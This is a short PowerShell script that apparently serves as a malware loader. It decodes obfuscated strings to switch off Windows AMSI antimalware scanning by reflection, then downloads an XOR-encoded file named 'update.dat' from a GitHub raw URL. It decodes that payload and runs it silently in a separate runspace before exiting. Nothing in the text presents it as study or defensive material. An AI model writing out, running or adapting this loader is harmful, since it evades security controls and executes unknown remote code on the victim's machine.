$_n=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('U3lzdGVtLk1hbmFnZW1lbnQuQXV0b21hdGlvbi5BbXNpVXRpbHM='))
$_f=[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('YW1zaUNvbnRleHQ='))
try{$_t=[Ref].Assembly.GetType($_n);$_c=$_t.GetField($_f,[Reflection.BindingFlags]40);$_p=$_c.GetValue($null);[Runtime.InteropServices.Marshal]::WriteInt32($_p,0)}catch{}
[Net.ServicePointManager]::SecurityProtocol=[Net.SecurityProtocolType]::Tls12
$_enc=(New-Object Net.WebClient).DownloadData('https://raw.githubusercontent.com/Tokenairdrop527/update/refs/heads/main/update.dat')
$_code=[Text.Encoding]::UTF8.GetString(($_enc|%{$_-bxor0xAE}))
$_rs=[RunspaceFactory]::CreateRunspace()
$_rs.Open()
$_ps=[PowerShell]::Create()
$_ps.Runspace=$_rs
[void]$_ps.AddScript($_code)
[void]$_ps.BeginInvoke()
exit